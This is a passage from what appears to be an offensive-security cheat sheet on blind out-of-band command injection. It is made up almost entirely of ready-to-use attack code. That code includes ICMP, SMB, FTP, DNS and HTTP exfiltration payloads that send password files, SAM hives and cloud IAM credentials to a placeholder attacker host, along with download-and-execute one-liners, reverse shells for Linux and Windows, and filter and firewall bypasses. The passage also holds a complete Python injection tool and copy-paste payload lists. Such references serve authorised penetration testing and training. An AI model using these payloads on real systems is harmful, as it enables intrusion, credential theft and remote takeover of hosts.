  & powershell -c "$ping = New-Object System.Net.NetworkInformation.Ping; $data = [Text.Encoding]::UTF8.GetBytes((whoami)); $ping.Send('ATTACKER_IP', 1000, $data)"

  # Chunked ICMP exfiltration
  & powershell -c "$data=[Text.Encoding]::UTF8.GetBytes((Get-Content C:\flag.txt)); $ping=New-Object System.Net.NetworkInformation.Ping; for($i=0;$i -lt $data.Length;$i+=32){$chunk=$data[$i..[Math]::Min($i+31,$data.Length-1)]; $ping.Send('ATTACKER_IP',1000,$chunk); Start-Sleep -Milliseconds 500}"
  ```

  :::

  :::tabs-item{icon="i-lucide-terminal" label="ICMP Receiver"}

  ```bash [ICMP Data Receiver]
  # Using tcpdump to capture ICMP data
  sudo tcpdump -i eth0 'icmp and icmp[icmptype]=icmp-echo' -X -l | \
    grep -oP '0x[0-9a-f]+:\s+(.+)' | tee icmp_capture.txt

  # Using tshark for cleaner output
  sudo tshark -i eth0 -f "icmp" -T fields \
    -e ip.src -e data.data -l 2>/dev/null | \
    while read src data; do
      echo "[$src] $(echo $data | xxd -r -p 2>/dev/null)"
    done

  # Python ICMP receiver
  sudo python3 << 'PYEOF'
  import socket, struct

  sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
  sock.bind(('0.0.0.0', 0))
  print('[*] ICMP listener started')

  while True:
      data, addr = sock.recvfrom(65535)
      # ICMP header starts at byte 20 (after IP header)
      icmp_type = data[20]
      if icmp_type == 8:  # Echo Request
          payload = data[28:]  # Skip IP (20) + ICMP header (8)
          if payload:
              print(f'[+] From {addr[0]}: {payload.decode(errors="replace")}')
  PYEOF
  ```

  :::
::

---

## SMB-Based Exfiltration (Windows)

SMB (port 445) is commonly used in Windows environments. UNC path access triggers NTLM authentication, leaking Net-NTLMv2 hashes.

```bash [SMB Exfiltration — Attacker Setup]
# Start Responder to capture NTLM hashes
sudo responder -I eth0

# Start Impacket SMB server
sudo python3 /usr/share/impacket/examples/smbserver.py share /tmp -smb2support

# Start custom SMB server for file exfiltration
sudo python3 /usr/share/impacket/examples/smbserver.py exfil /tmp/exfil -smb2support
```

```cmd [SMB Exfiltration Payloads — Windows]
:: Trigger NTLM hash leak via UNC path
& net use \\ATTACKER_IP\share
& dir \\ATTACKER_IP\share
& type \\ATTACKER_IP\share\test.txt
& copy \\ATTACKER_IP\share\test.txt C:\test.txt

:: Exfiltrate files TO attacker's SMB share
& copy C:\Users\Administrator\Desktop\flag.txt \\ATTACKER_IP\exfil\flag.txt
& copy C:\Windows\System32\config\SAM \\ATTACKER_IP\exfil\SAM
& copy C:\Windows\repair\SAM \\ATTACKER_IP\exfil\SAM
& xcopy C:\Users\Administrator\Documents \\ATTACKER_IP\exfil\ /E /Y

:: Write command output to attacker's share
& whoami > \\ATTACKER_IP\exfil\whoami.txt
& systeminfo > \\ATTACKER_IP\exfil\sysinfo.txt
& ipconfig /all > \\ATTACKER_IP\exfil\ipconfig.txt
& netstat -ano > \\ATTACKER_IP\exfil\netstat.txt
& net user > \\ATTACKER_IP\exfil\users.txt
& net localgroup administrators > \\ATTACKER_IP\exfil\admins.txt
& tasklist > \\ATTACKER_IP\exfil\processes.txt

:: PowerShell SMB exfiltration
& powershell -c "Copy-Item C:\flag.txt \\ATTACKER_IP\exfil\"
& powershell -c "Get-Process | Out-File \\ATTACKER_IP\exfil\procs.txt"
& powershell -c "Get-Service | Out-File \\ATTACKER_IP\exfil\services.txt"

:: Using certutil to encode + SMB to transfer
& certutil -encode C:\flag.txt C:\Windows\Temp\b64.txt & copy C:\Windows\Temp\b64.txt \\ATTACKER_IP\exfil\

:: UNC path in different contexts to leak hash
& start \\ATTACKER_IP\share
& pushd \\ATTACKER_IP\share
& cmd /c \\ATTACKER_IP\share\payload.exe
```

```bash [SMB from Linux Target (rare)]
# If smbclient is available
; smbclient //ATTACKER_IP/share -N -c "put /etc/passwd passwd.txt"

# Using /dev/tcp (won't speak SMB but triggers connection)
; echo "test" > /dev/tcp/ATTACKER_IP/445
```

---

## FTP-Based Exfiltration

```bash [FTP Exfiltration — Attacker Setup]
# Start Python FTP server
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21 -w --user=anonymous --password=anonymous

# Or use pure-ftpd / vsftpd
```

```bash [FTP Exfiltration Payloads — Linux]
# Using curl
; curl -T /etc/passwd ftp://ATTACKER_IP/passwd.txt
; curl -T /etc/shadow ftp://ATTACKER_IP/shadow.txt --user anonymous:anonymous

# Using ftp command
; ftp -n ATTACKER_IP << EOF
user anonymous anonymous
put /etc/passwd passwd.txt
quit
EOF

# Using Python
; python3 -c "
from ftplib import FTP
ftp = FTP('ATTACKER_IP')
ftp.login('anonymous','anonymous')
ftp.storbinary('STOR passwd.txt', open('/etc/passwd','rb'))
ftp.quit()
"

# Using wget
; wget --ftp-user=anonymous --ftp-password=anonymous ftp://ATTACKER_IP/commands.txt
```

```cmd [FTP Exfiltration Payloads — Windows]
:: Create FTP script and execute
& echo open ATTACKER_IP > C:\Windows\Temp\ftp.txt
& echo anonymous >> C:\Windows\Temp\ftp.txt
& echo anonymous >> C:\Windows\Temp\ftp.txt
& echo binary >> C:\Windows\Temp\ftp.txt
& echo put C:\flag.txt >> C:\Windows\Temp\ftp.txt
& echo quit >> C:\Windows\Temp\ftp.txt
& ftp -s:C:\Windows\Temp\ftp.txt

:: PowerShell FTP
& powershell -c "$wc=New-Object Net.WebClient; $wc.UploadFile('ftp://ATTACKER_IP/flag.txt','C:\flag.txt')"
```

---

## Advanced Exfiltration Techniques

### Cloud Metadata Exfiltration

```bash [Cloud Metadata via OOB — Linux]
# AWS metadata → exfiltrate IAM credentials
; curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ | \
  while read role; do
    curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/$role" | \
    base64 -w0 | fold -w 50 | while read chunk; do
      nslookup "${chunk}.ATTACKER.com"
      sleep 0.3
    done
  done

# Single-line AWS credential exfiltration
; curl -X POST -d "$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/))" http://ATTACKER.com/collect

# AWS user-data (may contain secrets)
; curl -X POST -d "$(curl -s http://169.254.169.254/latest/user-data)" http://ATTACKER.com/collect

# GCP metadata
; curl -X POST -d "$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token)" http://ATTACKER.com/collect

# Azure metadata
; curl -X POST -d "$(curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/instance?api-version=2021-02-01')" http://ATTACKER.com/collect

# DigitalOcean metadata
; curl -X POST -d "$(curl -s http://169.254.169.254/metadata/v1.json)" http://ATTACKER.com/collect
```

### File Download + Execute via OOB

```bash [Stage Payloads via OOB — Linux]
# Download and execute shell script
; curl http://ATTACKER.com/shell.sh | bash
; wget http://ATTACKER.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh
; curl http://ATTACKER.com/shell.sh -o /tmp/s && chmod +x /tmp/s && /tmp/s

# Download and execute Python payload
; curl http://ATTACKER.com/payload.py | python3
; wget http://ATTACKER.com/payload.py -O - | python3

# Download and execute via /dev/tcp
; bash -c 'exec 3<>/dev/tcp/ATTACKER_IP/80; echo -e "GET /shell.sh HTTP/1.1\r\nHost: ATTACKER_IP\r\n\r\n" >&3; cat <&3 | sed "1,/^$/d" | bash'

# Perl download and execute
; perl -e 'use LWP::Simple; my $c=get("http://ATTACKER.com/shell.sh"); system($c)'

# PHP download and execute
; php -r 'system(file_get_contents("http://ATTACKER.com/shell.sh"));'

# Without writing to disk (fileless)
; curl -s http://ATTACKER.com/payload | bash
; wget -qO- http://ATTACKER.com/payload | sh
; python3 -c "exec(__import__('urllib.request',fromlist=['urlopen']).urlopen('http://ATTACKER.com/payload.py').read())"
```

```cmd [Stage Payloads via OOB — Windows]
:: certutil download
& certutil -urlcache -split -f http://ATTACKER.com/payload.exe C:\Windows\Temp\p.exe & C:\Windows\Temp\p.exe

:: PowerShell download and execute
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER.com/payload.ps1')"
& powershell -c "IEX(IWR http://ATTACKER.com/payload.ps1 -UseBasicParsing)"

:: bitsadmin
& bitsadmin /transfer j http://ATTACKER.com/payload.exe C:\Windows\Temp\p.exe & C:\Windows\Temp\p.exe

:: mshta (executes HTA directly from URL)
& mshta http://ATTACKER.com/payload.hta

:: regsvr32 (AppLocker bypass)
& regsvr32 /s /n /u /i:http://ATTACKER.com/payload.sct scrobj.dll

:: WMIC download
& wmic os get /format:"http://ATTACKER.com/payload.xsl"
```

### Reverse Shell via OOB

::collapsible

```bash [Reverse Shell Payloads — Linux]
# Bash reverse shell
; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

# Netcat reverse shell
; nc ATTACKER_IP 4444 -e /bin/bash
; nc -e /bin/sh ATTACKER_IP 4444
; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Python reverse shell
; python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER_IP",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'

# Perl reverse shell
; perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")'

# PHP reverse shell
; php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Ruby reverse shell
; ruby -rsocket -e 'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'

# Socat reverse shell
; socat TCP:ATTACKER_IP:4444 EXEC:bash,pty,stderr,setsid,sigint,sane

# OpenSSL encrypted reverse shell
; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_IP:4444 > /tmp/s 2>/dev/null; rm /tmp/s
```

```powershell [Reverse Shell Payloads — Windows]
# PowerShell reverse shell
& powershell -c "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(IEX $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# PowerShell Base64 encoded reverse shell
& powershell -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAQwBQAEMAbABpAGUAbgB0ACgAJwBBAFQAVABBAEMASwBFAFIAXwBJAFAAJwAsADQANAA0ADQAKQA=

# Nishang PowerShell reverse shell
& powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER.com/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress ATTACKER_IP -Port 4444"
```

::

---

## Exfiltration Encoding & Data Handling

### Data Sanitization for Different Channels

```bash [Data Sanitization Reference]
# DNS-safe encoding (only a-z, 0-9, hyphens allowed in labels)
echo "data with spaces & special!chars" | xxd -p | tr -d '\n'
echo "data with spaces & special!chars" | base64 -w0 | tr '+/=' '-_0'
echo "data with spaces & special!chars" | base32 | tr '=' '0'
echo "data with spaces & special!chars" | tr -cd 'a-zA-Z0-9-'

# URL-safe encoding (for HTTP GET parameters)
echo "data" | python3 -c "import sys,urllib.parse; print(urllib.parse.quote(sys.stdin.read()))"
echo "data" | jq -sRr @uri
echo "data" | xxd -p | tr -d '\n'

# Compress before encoding (for large data)
cat /etc/passwd | gzip | base64 -w0
cat /etc/passwd | xz | base64 -w0
tar czf - /etc/ 2>/dev/null | base64 -w0

# Binary-safe encoding for any channel
cat /etc/passwd | xxd -p | tr -d '\n'
cat binary_file | base64 -w0
cat binary_file | od -A n -tx1 | tr -d ' \n'
```

### Decoding Exfiltrated Data on Attacker Side

```bash [Decoding Received Data]
# Decode hex
echo "726f6f743a783a303a" | xxd -r -p

# Decode base64
echo "cm9vdDp4OjA6" | base64 -d

# Decode DNS-safe base64 (restore original chars)
echo "cm9vdDp4OjA6" | tr '-_0' '+/=' | base64 -d

# Decode base32
echo "OJSWCZDFON2A====" | base32 -d

# Decompress gzipped base64
echo "H4sIAAAAAAAAA..." | base64 -d | gunzip

# Decode URL encoding
echo "root%3Ax%3A0%3A" | python3 -c "import sys,urllib.parse; print(urllib.parse.unquote(sys.stdin.read()))"

# Process DNS log into data
# If DNS log format: "query: 0-726f6f743a.attacker.com"
grep -oP '\d+-[a-f0-9]+(?=\.)' dns_log.txt | sort -t- -k1 -n | cut -d- -f2- | tr -d '\n' | xxd -r -p
```

---

## OOB with Filter Bypass

Combine OOB techniques with filter bypass methods when commands or characters are blocked.

### Bypassing Blocked Commands

::tabs
  :::tabs-item{icon="i-lucide-shield-off" label="nslookup Blocked"}

  ```bash [When nslookup is Blocked]
  # Use dig instead
  ; dig $(whoami).ATTACKER.com

  # Use host
  ; host $(whoami).ATTACKER.com

  # Use ping (triggers DNS)
  ; ping -c 1 $(whoami).ATTACKER.com

  # Use curl/wget (triggers DNS + HTTP)
  ; curl $(whoami).ATTACKER.com
  ; wget $(whoami).ATTACKER.com

  # Use Python
  ; python3 -c "__import__('socket').getaddrinfo('$(whoami).ATTACKER.com',80)"

  # Use Perl
  ; perl -e "gethostbyname('$(whoami).ATTACKER.com')"

  # Use PHP
  ; php -r "dns_get_record('$(whoami).ATTACKER.com');"

  # Use /dev/udp (bash raw DNS — no external commands)
  ; bash -c "echo > /dev/udp/$(whoami).ATTACKER.com/53"

  # Obfuscated nslookup
  ; n''s''l''o''o''k''u''p $(whoami).ATTACKER.com
  ; n\sl\oo\ku\p $(whoami).ATTACKER.com
  ; /usr/bin/n?lookup $(whoami).ATTACKER.com
  ; $(printf '\x6e\x73\x6c\x6f\x6f\x6b\x75\x70') $(whoami).ATTACKER.com
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="curl/wget Blocked"}

  ```bash [When curl/wget are Blocked]
  # Use /dev/tcp (bash built-in)
  ; exec 3<>/dev/tcp/ATTACKER.com/80; echo -e "GET /$(whoami) HTTP/1.1\r\nHost: ATTACKER.com\r\n\r\n" >&3; cat <&3

  # Use Python
  ; python3 -c "import urllib.request; urllib.request.urlopen('http://ATTACKER.com/'+__import__('os').popen('whoami').read().strip())"

  # Use Perl
  ; perl -MLWP::Simple -e 'get("http://ATTACKER.com/".`whoami`)'
  ; perl -e 'use IO::Socket::INET; $s=IO::Socket::INET->new(PeerAddr=>"ATTACKER.com:80"); print $s "GET /".`whoami`." HTTP/1.1\r\nHost: ATTACKER.com\r\n\r\n"'

  # Use PHP
  ; php -r 'file_get_contents("http://ATTACKER.com/".trim(shell_exec("whoami")));'

  # Use Ruby
  ; ruby -e "require 'net/http'; Net::HTTP.get(URI('http://ATTACKER.com/'+\`whoami\`.strip))"

  # Use Node.js
  ; node -e "require('http').get('http://ATTACKER.com/'+require('child_process').execSync('whoami').toString().trim())"

  # Use nc (netcat)
  ; echo -e "GET /$(whoami) HTTP/1.1\r\nHost: ATTACKER.com\r\n\r\n" | nc ATTACKER.com 80

  # Use socat
  ; echo "$(whoami)" | socat - TCP:ATTACKER.com:80

  # Use telnet
  ; (echo -e "GET /$(whoami) HTTP/1.0\r\nHost: ATTACKER.com\r\n\r\n"; sleep 2) | telnet ATTACKER.com 80

  # Obfuscated curl
  ; c''u''r''l http://ATTACKER.com/$(whoami)
  ; c\ur\l http://ATTACKER.com/$(whoami)
  ; /usr/bin/c?rl http://ATTACKER.com/$(whoami)
  ```

  :::

  :::tabs-item{icon="i-lucide-shield-off" label="Space & Char Bypass"}

  ```bash [OOB with Character Bypass]
  # Space bypass with $IFS
  ;curl${IFS}http://ATTACKER.com/$(whoami)
  ;nslookup${IFS}$(whoami).ATTACKER.com
  ;wget${IFS}http://ATTACKER.com/$(whoami)${IFS}-O${IFS}/dev/null

  # Brace expansion (no spaces)
  ;{curl,http://ATTACKER.com/$(whoami)}
  ;{nslookup,$(whoami).ATTACKER.com}
  ;{wget,http://ATTACKER.com/$(whoami),-O,/dev/null}

  # Tab character
  ;curl%09http://ATTACKER.com/$(whoami)
  ;nslookup%09$(whoami).ATTACKER.com

  # Quote insertion
  ;c'u'r'l' http://ATTACKER.com/$(whoami)
  ;n's'l'o'o'k'u'p $(whoami).ATTACKER.com

  # Backslash
  ;c\u\r\l http://ATTACKER.com/$(whoami)
  ;n\s\l\o\o\k\u\p $(whoami).ATTACKER.com

  # Variable concat
  ;a=cu;b=rl;$a$b http://ATTACKER.com/$(whoami)
  ;a=nsl;b=ookup;$a$b $(whoami).ATTACKER.com

  # Hex encoding
  ;$(printf '\x63\x75\x72\x6c') http://ATTACKER.com/$(whoami)

  # Base64 full payload
  ;echo Y3VybCBodHRwOi8vQVRUQUNLRVIuY29tLyQod2hvYW1pKQ== | base64 -d | bash
  ```

  :::
::

### Bypassing Egress Firewalls

```bash [Egress Firewall Bypass Strategies]
# Test which ports are open outbound
; for port in 53 80 443 8080 8443 25 21 22 110 143 993 995 3306 5432; do
    (echo > /dev/tcp/ATTACKER_IP/$port) 2>/dev/null && \
    nslookup "port-${port}-open.ATTACKER.com" || true;
  done

# DNS almost always works (port 53)
; nslookup $(whoami).ATTACKER.com

# HTTPS (port 443) usually open
; curl -k https://ATTACKER.com/$(whoami)

# DNS over HTTPS (DoH) — uses port 443
; curl -s "https://dns.google/resolve?name=$(whoami).ATTACKER.com&type=A"
; curl -s -H "Accept: application/dns-json" "https://cloudflare-dns.com/dns-query?name=$(whoami).ATTACKER.com&type=A"

# Use allowed ports (8080, 8443, etc.)
; curl http://ATTACKER.com:8080/$(whoami)
; curl http://ATTACKER.com:8443/$(whoami)

# Tunnel through SSH (if outbound SSH allowed)
; ssh -R 4444:localhost:22 attacker@ATTACKER_IP

# Tunnel through DNS (dnscat2, iodine)
# Requires pre-installed tools on target

# Piggyback on existing connections
# If target makes legitimate HTTP calls, inject data there
```

---

## Automation & Tooling

### Commix for OOB

```bash [Commix — Automated OOB Injection]
# Basic OOB detection with Commix
commix -u "http://target.com/page?input=test" --technique=E

# Specify OOB collaborator
commix -u "http://target.com/page?input=test" \
  --technique=E \
  --os-cmd="whoami" \
  --batch

# With DNS exfiltration
commix -u "http://target.com/page?input=test" \
  --technique=E \
  --dns-server=ATTACKER_IP

# Force specific technique
# E = file-based (evaluation)
# T = time-based
# F = file-based
commix -u "http://target.com/page?input=test" \
  --technique=E \
  --level=3

# With POST data
commix -u "http://target.com/api" \
  --data="cmd=test" \
  --technique=E \
  --batch

# With cookie authentication
commix -u "http://target.com/page?input=test" \
  --cookie="session=VALID" \
  --technique=E

# Through proxy
commix -u "http://target.com/page?input=test" \
  --proxy="http://127.0.0.1:8080" \
  --technique=E

# Tamper scripts for filter bypass
commix -u "http://target.com/page?input=test" \
  --tamper=base64encode \
  --technique=E

# Shell access
commix -u "http://target.com/page?input=test" \
  --technique=E \
  --os-shell
```

### Custom OOB Automation Script

```python [oob_injector.py]
#!/usr/bin/env python3
"""
Blind OOB Command Injection Automation Tool
Tests multiple OOB channels and exfiltration methods
"""
import requests
import argparse
import time
import sys
from urllib.parse import quote

class OOBInjector:
    def __init__(self, target_url, param, attacker_domain, method='GET',
                 cookie=None, headers=None, data=None):
        self.target_url = target_url
        self.param = param
        self.attacker = attacker_domain
        self.method = method.upper()
        self.session = requests.Session()
        self.session.verify = False

        if cookie:
            self.session.headers['Cookie'] = cookie
        if headers:
            for h in headers:
                k, v = h.split(':', 1)
                self.session.headers[k.strip()] = v.strip()

        self.data = data
        self.results = []

    def inject(self, payload, description=""):
        """Send injection payload to target."""
        try:
            if self.method == 'GET':
                params = {self.param: payload}
                r = self.session.get(self.target_url, params=params, timeout=15)
            else:
                post_data = {}
                if self.data:
                    for pair in self.data.split('&'):
                        k, v = pair.split('=', 1)
                        post_data[k] = v
                post_data[self.param] = payload
                r = self.session.post(self.target_url, data=post_data, timeout=15)

            self.results.append({
                'payload': payload,
                'description': description,
                'status': r.status_code,
                'length': len(r.text)
            })
            return True
        except Exception as e:
            print(f"  [!] Error: {e}")
            return False

    def test_dns_oob(self):
        """Test DNS-based OOB exfiltration."""
        print("\n[*] Testing DNS-based OOB...")
        payloads = [
            (f"; nslookup dns-test.{self.attacker}", "nslookup semicolon"),
            (f"| nslookup dns-test.{self.attacker}", "nslookup pipe"),
            (f"& nslookup dns-test.{self.attacker}", "nslookup ampersand"),
            (f"&& nslookup dns-test.{self.attacker}", "nslookup AND"),
            (f"|| nslookup dns-test.{self.attacker}", "nslookup OR"),
            (f"`nslookup dns-test.{self.attacker}`", "nslookup backtick"),
            (f"$(nslookup dns-test.{self.attacker})", "nslookup dollar"),
            (f"%0anslookup dns-test.{self.attacker}", "nslookup newline"),
            (f"; dig dns-test.{self.attacker}", "dig semicolon"),
            (f"; host dns-test.{self.attacker}", "host semicolon"),
            (f"; ping -c 1 dns-test.{self.attacker}", "ping semicolon"),
        ]
        for payload, desc in payloads:
            print(f"  [>] {desc}: {payload[:80]}")
            self.inject(payload, desc)
            time.sleep(1)

    def test_http_oob(self):
        """Test HTTP-based OOB exfiltration."""
        print("\n[*] Testing HTTP-based OOB...")
        payloads = [
            (f"; curl http://{self.attacker}/http-test", "curl semicolon"),
            (f"| curl http://{self.attacker}/http-test", "curl pipe"),
            (f"& curl http://{self.attacker}/http-test", "curl ampersand"),
            (f"`curl http://{self.attacker}/http-test`", "curl backtick"),
            (f"$(curl http://{self.attacker}/http-test)", "curl dollar"),
            (f"; wget http://{self.attacker}/http-test -O /dev/null", "wget semicolon"),
            (f"; curl http://{self.attacker}/$(whoami)", "curl exfil whoami"),
            (f"; curl http://{self.attacker}/$(hostname)", "curl exfil hostname"),
        ]
        for payload, desc in payloads:
            print(f"  [>] {desc}: {payload[:80]}")
            self.inject(payload, desc)
            time.sleep(1)

    def test_dns_exfil(self):
        """Test DNS data exfiltration."""
        print("\n[*] Testing DNS data exfiltration...")
        payloads = [
            (f"; nslookup $(whoami).{self.attacker}", "DNS exfil whoami"),
            (f"; nslookup $(hostname).{self.attacker}", "DNS exfil hostname"),
            (f"; nslookup $(id -u).{self.attacker}", "DNS exfil uid"),
            (f"; nslookup $(uname -s).{self.attacker}", "DNS exfil uname"),
            (f"; dig $(whoami).{self.attacker}", "dig exfil whoami"),
            (f"; ping -c 1 $(whoami).{self.attacker}", "ping exfil whoami"),
            (f"; nslookup $(whoami|xxd -p).{self.attacker}", "DNS hex exfil whoami"),
        ]
        for payload, desc in payloads:
            print(f"  [>] {desc}: {payload[:80]}")
            self.inject(payload, desc)
            time.sleep(1)

    def test_bypass_oob(self):
        """Test OOB with filter bypass techniques."""
        print("\n[*] Testing OOB with filter bypasses...")
        payloads = [
            # Space bypass
            (f";curl${{IFS}}http://{self.attacker}/bypass1", "IFS space bypass"),
            (f";{{curl,http://{self.attacker}/bypass2}}", "brace expansion"),
            (f";curl%09http://{self.attacker}/bypass3", "tab space bypass"),

            # Command obfuscation
            (f";c'u'r'l' http://{self.attacker}/bypass4", "quote obfuscation"),
            (f";c\\url http://{self.attacker}/bypass5", "backslash obfuscation"),
            (f";n''s''lookup bypass6.{self.attacker}", "nslookup quote bypass"),

            # Encoding
            (f";$(printf '\\x63\\x75\\x72\\x6c') http://{self.attacker}/bypass7", "hex encoded curl"),
            (f";echo Y3VybCBodHRwOi8ve3NlbGYuYXR0YWNrZXJ9L2J5cGFzcw== | base64 -d | bash", "base64 pipeline"),

            # Alternative tools
            (f";python3 -c \"__import__('urllib.request').request.urlopen('http://{self.attacker}/bypass8')\"", "python urllib"),
            (f";perl -MLWP::Simple -e 'get(\"http://{self.attacker}/bypass9\")'", "perl lwp"),

            # Windows payloads
            (f"& nslookup bypass10.{self.attacker}", "windows nslookup"),
            (f"& powershell -c \"Resolve-DnsName bypass11.{self.attacker}\"", "powershell dns"),
            (f"& certutil -urlcache -split -f http://{self.attacker}/bypass12 C:\\Windows\\Temp\\null", "certutil"),
        ]
        for payload, desc in payloads:
            print(f"  [>] {desc}: {payload[:80]}")
            self.inject(payload, desc)
            time.sleep(1)

    def test_windows_oob(self):
        """Test Windows-specific OOB payloads."""
        print("\n[*] Testing Windows-specific OOB...")
        payloads = [
            (f"& nslookup %USERNAME%.{self.attacker}", "CMD username DNS"),
            (f"& nslookup %COMPUTERNAME%.{self.attacker}", "CMD computername DNS"),
            (f"& ping -n 1 %USERNAME%.{self.attacker}", "CMD ping DNS"),
            (f"& powershell Resolve-DnsName ($env:USERNAME+'.{self.attacker}')", "PS DNS username"),
            (f"& powershell IWR http://{self.attacker}/$env:USERNAME", "PS HTTP username"),
            (f"& for /f %i in ('whoami') do nslookup %i.{self.attacker}", "CMD FOR loop DNS"),
        ]
        for payload, desc in payloads:
            print(f"  [>] {desc}: {payload[:80]}")
            self.inject(payload, desc)
            time.sleep(1)

    def run_all(self):
        """Run all OOB tests."""
        print(f"[*] Target: {self.target_url}")
        print(f"[*] Parameter: {self.param}")
        print(f"[*] Attacker Domain: {self.attacker}")
        print(f"[*] Method: {self.method}")
        print(f"[*] Check your OOB listener for incoming connections!")
        print("=" * 60)

        self.test_dns_oob()
        self.test_http_oob()
        self.test_dns_exfil()
        self.test_bypass_oob()
        self.test_windows_oob()

        print(f"\n{'='*60}")
        print(f"[*] Sent {len(self.results)} payloads")
        print(f"[*] Check your OOB listener (Burp Collaborator, interactsh, custom)")
        print(f"[*] Look for DNS queries, HTTP requests, and ICMP packets")

if __name__ == '__main__':
    import urllib3
    urllib3.disable_warnings()

    p = argparse.ArgumentParser(description="Blind OOB Command Injection Tester")
    p.add_argument("-u", "--url", required=True, help="Target URL")
    p.add_argument("-p", "--param", required=True, help="Injectable parameter name")
    p.add_argument("-d", "--domain", required=True, help="Attacker OOB domain (e.g., xyz.burpcollaborator.net)")
    p.add_argument("-m", "--method", default="GET", choices=["GET", "POST"])
    p.add_argument("-c", "--cookie", help="Session cookie")
    p.add_argument("-H", "--header", action="append", help="Custom header (Key: Value)")
    p.add_argument("--data", help="POST data template (key1=val1&key2=val2)")
    p.add_argument("--delay", type=float, default=1.0, help="Delay between requests")
    args = p.parse_args()

    injector = OOBInjector(
        target_url=args.url,
        param=args.param,
        attacker_domain=args.domain,
        method=args.method,
        cookie=args.cookie,
        headers=args.header,
        data=args.data
    )
    injector.run_all()
```

```bash [OOB Injector Usage]
# Basic GET parameter testing
python3 oob_injector.py -u "http://target.com/page" -p "input" -d "xyz.burpcollaborator.net"

# POST parameter testing
python3 oob_injector.py -u "http://target.com/api" -p "cmd" -d "abc.oast.pro" -m POST

# With authentication
python3 oob_injector.py -u "http://target.com/page" -p "input" -d "xyz.burpcollaborator.net" \
  -c "session=VALID_SESSION" -H "X-CSRF-Token: TOKEN"

# With POST data
python3 oob_injector.py -u "http://target.com/api" -p "filename" -d "abc.oast.pro" \
  -m POST --data "action=convert&filename=test"
```

---

## Payload Quick Reference

### DNS OOB — Copy-Paste Payloads

::collapsible

```bash [DNS OOB Payload Collection]
# === LINUX — Basic Confirmation ===
; nslookup ATTACKER.com
| nslookup ATTACKER.com
& nslookup ATTACKER.com
&& nslookup ATTACKER.com
|| nslookup ATTACKER.com
`nslookup ATTACKER.com`
$(nslookup ATTACKER.com)
%0anslookup ATTACKER.com
; dig ATTACKER.com
; host ATTACKER.com
; ping -c 1 ATTACKER.com

# === LINUX — Data Exfiltration ===
; nslookup $(whoami).ATTACKER.com
; nslookup $(hostname).ATTACKER.com
; nslookup $(id -u).ATTACKER.com
; nslookup $(uname -s).ATTACKER.com
; dig $(whoami).ATTACKER.com
; ping -c 1 $(whoami).ATTACKER.com
; nslookup $(whoami|xxd -p).ATTACKER.com
; nslookup $(cat /etc/hostname|xxd -p).ATTACKER.com
; curl http://$(whoami).ATTACKER.com

# === LINUX — With Bypass ===
;nslookup${IFS}$(whoami).ATTACKER.com
;{nslookup,$(whoami).ATTACKER.com}
;n''s''l''o''o''k''u''p $(whoami).ATTACKER.com
;n\sl\oo\ku\p $(whoami).ATTACKER.com
;$(printf '\x6e\x73\x6c\x6f\x6f\x6b\x75\x70') $(whoami).ATTACKER.com
;ping${IFS}-c${IFS}1${IFS}$(whoami).ATTACKER.com

# === WINDOWS — Basic Confirmation ===
& nslookup ATTACKER.com
& ping -n 1 ATTACKER.com
& powershell Resolve-DnsName ATTACKER.com
& certutil -urlcache -split -f http://ATTACKER.com/test null

# === WINDOWS — Data Exfiltration ===
& nslookup %USERNAME%.ATTACKER.com
& nslookup %COMPUTERNAME%.ATTACKER.com
& for /f %i in ('whoami') do nslookup %i.ATTACKER.com
& powershell -c "Resolve-DnsName ($env:USERNAME+'.ATTACKER.com')"
& powershell -c "Resolve-DnsName ($env:COMPUTERNAME+'.ATTACKER.com')"
```

::

### HTTP OOB — Copy-Paste Payloads

::collapsible

```bash [HTTP OOB Payload Collection]
# === LINUX — Basic Confirmation ===
; curl http://ATTACKER.com
; wget http://ATTACKER.com -O /dev/null
; curl -k https://ATTACKER.com
| curl http://ATTACKER.com
`curl http://ATTACKER.com`
$(curl http://ATTACKER.com)

# === LINUX — Data Exfiltration (GET) ===
; curl http://ATTACKER.com/$(whoami)
; curl http://ATTACKER.com/$(hostname)
